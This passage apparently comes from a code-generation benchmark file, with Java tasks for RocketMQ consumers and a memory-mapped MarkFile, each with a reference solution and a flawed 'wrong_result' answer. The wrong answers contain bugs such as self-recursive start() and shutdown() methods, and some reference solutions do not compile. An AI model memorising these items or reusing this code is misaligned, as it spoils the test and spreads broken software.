    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer for processing order-related messages. The consumer should be initialized with Spring and configured to consume messages from a specified topic.\n\nClass Description: The OrderPushConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specified topic, configures consumption settings, and processes incoming messages asynchronously.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- topicName: String - The name of the topic to subscribe to (injected from properties)\n- namesrvAddr: String - The address of the NameServer (injected from properties)\n\nMethods:\n- init(): void - Initializes the consumer with configuration settings and starts it. This method is automatically called after construction due to the @PostConstruct annotation.\n  - Input: None\n  - Output: None\n  - Description: Configures the consumer with NameServer address, subscription details, batch size, and consumption strategy. Registers a message listener and starts the consumer.\n\n- (implicit) MessageListenerConcurrently.consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Handles incoming messages\n  - Input: \n    - msgs: List<MessageExt> - List of received messages\n    - context: ConsumeConcurrentlyContext - Context for concurrent consumption\n  - Output: ConsumeConcurrentlyStatus - Status indicating whether message processing was successful\n  - Description: The anonymous implementation of MessageListenerConcurrently that processes batches of messages. Currently returns CONSUME_SUCCESS for all messages.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void init() throws Exception {\n        consumer = new DefaultMQPushConsumer(\"create_order_consumer_group2\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName,\"*\");\n        consumer.setConsumeMessageBatchMaxSize(100);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Component\npublic class OrderPushConsumer {\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    private DefaultMQPushConsumer consumer;\n\n    @PostConstruct\n    public void init() {\n        consumer = new DefaultMQPushConsumer(\"OrderConsumerGroup\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName, \"*\");\n        consumer.setConsumeMessageBatchMaxSize(100);\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                // Process each message\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        try {\n            consumer.start();\n        } catch (MQClientException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to monitor and handle offset moved events in a message queue system.\n\nClass Description: The RocketMQConsumer class is designed to consume messages from a RocketMQ broker, specifically monitoring for offset moved events. It uses a push-based consumption model with a single-threaded listener to process messages. The class handles message subscription, listener configuration, and consumer lifecycle management.\n\nAttributes:\n- defaultMQPushConsumer: DefaultMQPushConsumer - The main consumer instance that connects to RocketMQ and handles message consumption\n- monitorListener: MonitorListener - (Assumed from context) Listener interface for reporting delete message events\n\nMethods:\n- RocketMQConsumer(RPCHook, String) -> void - Constructor that initializes the consumer with RPC hook and NameServer address\n- generateInstanceName(String) -> String - Generates a unique instance name for the consumer\n- configureMessageListener() -> void - Configures the message listener to handle incoming messages\n- subscribeToTopic() -> void - Subscribes to the offset moved event topic\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private final DefaultMQPushConsumer defaultMQPushConsumer;\n\n    public RocketMQConsumer(RPCHook rpcHook, String namesrvAddr) throws MQClientException {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(MixAll.MONITOR_CONSUMER_GROUP, rpcHook);\n        this.defaultMQPushConsumer.setNamesrvAddr(namesrvAddr);\n        this.defaultMQPushConsumer.setInstanceName(generateInstanceName(namesrvAddr));\n        this.defaultMQPushConsumer.setConsumeThreadMin(1);\n        this.defaultMQPushConsumer.setConsumeThreadMax(1);\n        \n        configureMessageListener();\n        subscribeToTopic();\n    }\n\n    private String generateInstanceName(String namesrvAddr) {\n        return \"MonitorService_\" + (System.currentTimeMillis() + RandomUtils.nextInt(0, Integer.MAX_VALUE) + namesrvAddr).hashCode();\n    }\n\n    private void configureMessageListener() {\n        this.defaultMQPushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                try {\n                    OffsetMovedEvent ome =\n                        OffsetMovedEvent.decode(msgs.get(0).getBody(), OffsetMovedEvent.class);\n\n                    DeleteMsgsEvent deleteMsgsEvent = new DeleteMsgsEvent();\n                    deleteMsgsEvent.setOffsetMovedEvent(ome);\n                    deleteMsgsEvent.setEventTimestamp(msgs.get(0).getStoreTimestamp());\n\n                    MonitorService.this.monitorListener.reportDeleteMsgsEvent(deleteMsgsEvent);\n                } catch (Exception e) {\n                }\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    private void subscribeToTopic() throws MQClientException {\n        this.defaultMQPushConsumer.subscribe(TopicValidator.RMQ_SYS_OFFSET_MOVED_EVENT, \"*\");\n    }\n\n    public void start() throws MQClientException {\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        this.defaultMQPushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer extends DefaultMQPushConsumer {\n    private MonitorListener monitorListener;\n\n    public RocketMQConsumer(RPCHook rpcHook, String nameServerAddr) {\n        super(generateInstanceName(nameServerAddr));\n        setRPCHook(rpcHook);\n        this.setNamesrvAddr(nameServerAddr);\n    }\n\n    private String generateInstanceName(String nameServerAddr) {\n        return \"RocketMQConsumer-\" + nameServerAddr + \"-\" + System.currentTimeMillis();\n    }\n\n    private void configureMessageListener() {\n        this.setMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    if (\"OFFSET_MOVED_TOPIC\".equals(msg.getTopic())) {\n                        monitorListener.onOffsetMoved(msg);\n                    }\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        this.setConsumeThreadMin(1);\n        this.setConsumeThreadMax(1);\n    }\n\n    private void subscribeToTopic() {\n        this.subscribe(\"OFFSET_MOVED_TOPIC\", \"*\");\n    }\n\n    public void start() {\n        try {\n            this.start();\n        } catch (MQClientException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        this.shutdown();\n    }\n\n    public void setMonitorListener(MonitorListener monitorListener) {\n        this.monitorListener = monitorListener;\n    }\n}"
  },
  {
    "Task_id": 364,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer capable of subscribing to topics, filtering messages, and processing them asynchronously.\n\nClass Description: The RocketMQConsumer class provides a wrapper around RocketMQ's DefaultMQPushConsumer to simplify consumer setup and message handling. It supports both tag-based and SQL92 filtering, configurable threading, and various RocketMQ features like message tracing and ACL.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The underlying RocketMQ push consumer instance\n- topic: String - The topic to subscribe to\n- group: String - The consumer group name\n- threadCount: int - Number of threads for message processing\n- filterType: String - Type of message filtering (TAG or SQL92)\n- expression: String - Filter expression (either tag or SQL condition)\n- msgTraceEnable: boolean - Whether to enable message tracing\n- aclEnable: boolean - Whether to enable access control\n- clientRebalanceEnable: boolean - Whether to enable client-side rebalancing\n- rpcHook: RPCHook - Custom RPC hook for authentication\n\nMethods:\n- initialize(): void - Initializes the consumer with configured settings and subscribes to the topic\n- setMessageListener(MessageListenerConcurrently listener): void - Registers a message listener for concurrent message processing\n- start(): void - Starts the consumer to begin receiving messages\n- shutdown(): void - Gracefully shuts down the consumer\n- setNamesrvAddr(String namesrvAddr): void - Sets the NameServer address for broker discovery",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.consumer.rebalance.AllocateMessageQueueAveragely;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.filter.ExpressionType;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String topic;\n    private String group;\n    private int threadCount;\n    private String filterType;\n    private String expression;\n    private boolean msgTraceEnable;\n    private boolean aclEnable;\n    private boolean clientRebalanceEnable;\n    private RPCHook rpcHook;\n\n    public RocketMQConsumer(String topic, String group, int threadCount, String filterType, \n                          String expression, boolean msgTraceEnable, boolean aclEnable, \n                          boolean clientRebalanceEnable, RPCHook rpcHook) {\n        this.topic = topic;\n        this.group = group;\n        this.threadCount = threadCount;\n        this.filterType = filterType;\n        this.expression = expression;\n        this.msgTraceEnable = msgTraceEnable;\n        this.aclEnable = aclEnable;\n        this.clientRebalanceEnable = clientRebalanceEnable;\n        this.rpcHook = rpcHook;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(group, rpcHook, new AllocateMessageQueueAveragely(), msgTraceEnable, null);\n        consumer.setConsumeThreadMin(threadCount);\n        consumer.setConsumeThreadMax(threadCount);\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setClientRebalance(clientRebalanceEnable);\n\n        if (filterType == null || expression == null) {\n            consumer.subscribe(topic, \"*\");\n        } else {\n            if (ExpressionType.TAG.equals(filterType)) {\n                String expr = MixAll.file2String(expression);\n                consumer.subscribe(topic, MessageSelector.byTag(expr));\n            } else if (ExpressionType.SQL92.equals(filterType)) {\n                String expr = MixAll.file2String(expression);\n                consumer.subscribe(topic, MessageSelector.bySql(expr));\n            } else {\n                throw new IllegalArgumentException(\"Not support filter type! \" + filterType);\n            }\n        }\n    }\n\n    public void setMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer {\n    private DefaultMQPushConsumer consumer;\n    private String topic;\n    private String group;\n    private int threadCount;\n    private String filterType;\n    private String expression;\n    private boolean msgTraceEnable;\n    private boolean aclEnable;\n    private boolean clientRebalanceEnable;\n    private RPCHook rpcHook;\n\n    public RocketMQConsumer(String group) {\n        this.group = group;\n        this.consumer = new DefaultMQPushConsumer(group);\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setThreadCount(int threadCount) {\n        this.threadCount = threadCount;\n    }\n\n    public void setFilterType(String filterType) {\n        this.filterType = filterType;\n    }\n\n    public void setExpression(String expression) {\n        this.expression = expression;\n    }\n\n    public void setMsgTraceEnable(boolean msgTraceEnable) {\n        this.msgTraceEnable = msgTraceEnable;\n    }\n\n    public void setAclEnable(boolean aclEnable) {\n        this.aclEnable = aclEnable;\n    }\n\n    public void setClientRebalanceEnable(boolean clientRebalanceEnable) {\n        this.clientRebalanceEnable = clientRebalanceEnable;\n    }\n\n    public void setRpcHook(RPCHook rpcHook) {\n        this.rpcHook = rpcHook;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void initialize() {\n        if (msgTraceEnable) {\n            consumer.enableMsgTrace();\n        }\n        if (aclEnable) {\n            consumer.enableAcl();\n        }\n        if (clientRebalanceEnable) {\n            consumer.setClientRebalanceEnable(clientRebalanceEnable);\n        }\n        if (rpcHook != null) {\n            consumer.setRPCHook(rpcHook);\n        }\n        consumer.setConsumeThreadMin(threadCount);\n        consumer.setConsumeThreadMax(threadCount);\n        if (\"TAG\".equals(filterType)) {\n            consumer.subscribe(topic, expression);\n        } else {\n            SQLMessageFilter sqlFilter = new SQLMessageFilter(expression);\n            consumer.setMessageFilter(sqlFilter);\n            consumer.subscribe(topic, \"*\");\n        }\n    }\n\n    public void setMessageListener(MessageListenerConcurrently listener) {\n        consumer.setMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 366,
    "Instruction": "Task Description: Implement a RocketMQ consumer class in Java that can subscribe to a topic, consume messages asynchronously, and handle message consumption with configurable retry behavior.\n\nClass Description: The RocketMQConsumer class is responsible for consuming messages from a RocketMQ broker. It provides functionality to initialize the consumer, start message consumption with configurable retry behavior, and shutdown the consumer gracefully.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- consumerGroup: String - The consumer group name\n- topic: String - The topic to subscribe to\n- subscription: String - The subscription expression (tags filter)\n- returnFailedHalf: boolean - Flag to control whether to return failure status for half of the messages\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the consumer instance with the specified group name and subscription\n- start() throws MQClientException -> void - Starts the consumer with a message listener that handles incoming messages and implements the retry logic\n- shutdown() -> void - Shuts down the consumer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subscription;\n    private boolean returnFailedHalf;\n\n    public RocketMQConsumer(String consumerGroup, String topic, String subscription, boolean returnFailedHalf) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subscription = subscription;\n        this.returnFailedHalf = returnFailedHalf;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.subscribe(topic, subscription != null ? subscription : \"*\");\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            AtomicLong consumeTimes = new AtomicLong(0);\n\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                long currentTimes = this.consumeTimes.incrementAndGet();\n                System.out.printf(\"%-8d %s%n\", currentTimes, msgs);\n                if (returnFailedHalf) {\n                    if ((currentTimes % 2) == 0) {\n                        return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                    }\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer {\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subscription;\n    private boolean returnFailedHalf;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.subscribe(topic, subscription);\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            if (returnFailedHalf && Math.random() < 0.5) {\n                return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n            }\n            for (MessageExt msg : msgs) {\n                // Process the message\n                // Add your custom message processing logic here\n            }\n            return ConsumeConcurrentlyStatus.SUCCESS;\n        });\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class responsible for setting up a RocketMQ push consumer. It configures the consumer with NameServer address, consumption strategy, topic subscriptions, and message listeners. The consumer is started asynchronously after a short delay to ensure proper initialization.\n\nAttributes:\n- `uacPushMessageListener`: [UacPushMessageListener] - The message listener implementation that handles incoming messages\n- `paascloudProperties`: [PaascloudProperties] - Configuration properties containing RocketMQ settings\n- `taskExecutor`: [TaskExecutor] - Executor service for asynchronous consumer startup\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer with the following steps:\n  1. Creates a new DefaultMQPushConsumer instance with the consumer group from properties\n  2. Sets the NameServer address from properties\n  3. Configures consumption to start from the last offset\n  4. Parses and subscribes to topics and tags from constants\n  5. Registers the message listener\n  6. Sets thread pool size for message consumption\n  7. Starts the consumer asynchronously after a 5-second delay\n  8. Returns the configured consumer instance",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.mq.consumer.listener.UacPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.core.task.TaskExecutor;\n\n@Configuration\npublic class AliyunMqConfiguration {\n    @Resource\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.UAC.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                log.error(\"RocketMq OpcPushConsumer, Exception={}\", e.getMessage(), e);\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private TaskExecutor taskExecutor;\n\n    public DefaultMQPushConsumer defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getNameServerAddress());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        List<String> topics = paascloudProperties.getTopics();\n        for (String topic : topics) {\n            consumer.subscribe(topic, \"*\");\n        }\n\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMin(20);\n        consumer.setConsumeThreadMax(20);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n\n        return consumer;\n    }\n}"
  },
  {
    "Task_id": 368,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic.\n\nClass Description: The RocketMQConsumer class provides functionality to initialize, configure, and manage a RocketMQ push consumer. It allows subscribing to topics, registering message listeners, and controlling the consumer lifecycle.\n\nAttributes:\n- pushConsumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- initializeConsumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group and NameServer address. Sets consumption strategy to start from last offset and message model to clustering.\n- subscribeToTopic(String topic, String tagExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages\n- startConsumer() -> void - Starts the consumer to begin receiving messages\n- shutdownConsumer() -> void - Gracefully shuts down the consumer instance",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) throws MQClientException {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                return listener.consumeMessage(msgs, context);\n            }\n        });\n    }\n\n    public void startConsumer() throws MQClientException {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer {\n    private DefaultMQPushConsumer pushConsumer;\n\n    public void initializeConsumer(String consumerGroup, String namesrvAddr) {\n        pushConsumer = new DefaultMQPushConsumer(consumerGroup);\n        pushConsumer.setNamesrvAddr(namesrvAddr);\n        pushConsumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        pushConsumer.setMessageModel(MessageModel.CLUSTERING);\n    }\n\n    public void subscribeToTopic(String topic, String tagExpression) {\n        pushConsumer.subscribe(topic, tagExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        pushConsumer.setMessageListener(listener);\n    }\n\n    public void startConsumer() {\n        pushConsumer.start();\n    }\n\n    public void shutdownConsumer() {\n        pushConsumer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Create a Java class that manages a mark file for inter-process communication, allowing processes to check the status of another process through a shared memory-mapped file. The class should handle file creation, version checking, timestamp validation, and resource cleanup.\n\nClass Description: The MarkFile class provides a mechanism for processes to communicate their liveness status via a memory-mapped file. It supports checking version compatibility, monitoring heartbeat timestamps, and ensuring proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- markFile: File - The physical file used for marking process status\n- mappedBuffer: MappedByteBuffer - The memory-mapped buffer for file operations\n- buffer: UnsafeBuffer - Wrapper around mappedBuffer for atomic operations\n- isClosed: AtomicBoolean - Flag indicating whether resources have been released\n\nMethods:\n- MarkFile(File, boolean, int, int, int, long, EpochClock, IntConsumer, Consumer<String>) -> void - Constructor that initializes the mark file with version and timestamp fields\n- close() -> void - Releases resources and closes the file channel\n- mapNewOrExistingMarkFile(File, boolean, int, int, long, long, EpochClock, IntConsumer, Consumer<String>) -> MappedByteBuffer - Static method that maps the file into memory and performs version/timestamp validation\n- ensureMarkFileLink(File, File, String) -> void - Static method that manages symbolic links to the mark file directory",
    "Canonical_solution": "import org.agrona.concurrent.UnsafeBuffer;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\nimport java.util.function.IntConsumer;\nimport static java.nio.channels.FileChannel.MapMode.READ_WRITE;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.READ;\nimport static java.nio.file.StandardOpenOption.WRITE;\n\npublic class MarkFile implements AutoCloseable\n{\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed = new AtomicBoolean();\n\n    public MarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final int totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        this.markFile = markFile;\n        this.mappedBuffer = mapNewOrExistingMarkFile(\n            markFile,\n            shouldPreExist,\n            versionFieldOffset,\n            timestampFieldOffset,\n            totalFileLength,\n            timeoutMs,\n            epochClock,\n            versionCheck,\n            logger);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n    }\n\n    public void close()\n    {\n        if (isClosed.compareAndSet(false, true))\n        {\n            BufferUtil.free(mappedBuffer);\n        }\n    }\n\n    public static MappedByteBuffer mapNewOrExistingMarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final long totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        MappedByteBuffer byteBuffer = null;\n\n        try (FileChannel channel = FileChannel.open(markFile.toPath(), CREATE, READ, WRITE))\n        {\n            byteBuffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, totalFileLength);\n            final UnsafeBuffer buffer = new UnsafeBuffer(byteBuffer);\n\n            if (shouldPreExist)\n            {\n                if (buffer.capacity() < (timestampFieldOffset + SIZE_OF_LONG))\n                {\n                    throw new IllegalStateException(\"active MarkFile too short capacity=\" + buffer.capacity() +\n                        \" < \" + (timestampFieldOffset + SIZE_OF_LONG));\n                }\n\n                final int version = buffer.getIntVolatile(versionFieldOffset);\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: Mark file exists: \" + markFile);\n                }\n\n                versionCheck.accept(version);\n\n                final long timestampMs = buffer.getLongVolatile(timestampFieldOffset);\n                final long timestampAgeMs = epochClock.time() - timestampMs;\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: heartbeat timestampMs=\" + timestampMs + \" ageMs=\" + timestampAgeMs);\n                }\n\n                if (timestampAgeMs < timeoutMs)\n                {\n                    throw new IllegalStateException(\"active Mark file detected\");\n                }\n            }\n        }\n        catch (final Exception ex)\n        {\n            if (null != byteBuffer)\n            {\n                BufferUtil.free(byteBuffer);\n            }\n\n            throw new RuntimeException(ex);\n        }\n\n        return byteBuffer;\n    }\n\n    public static void ensureMarkFileLink(final File serviceDir, final File actualFile, 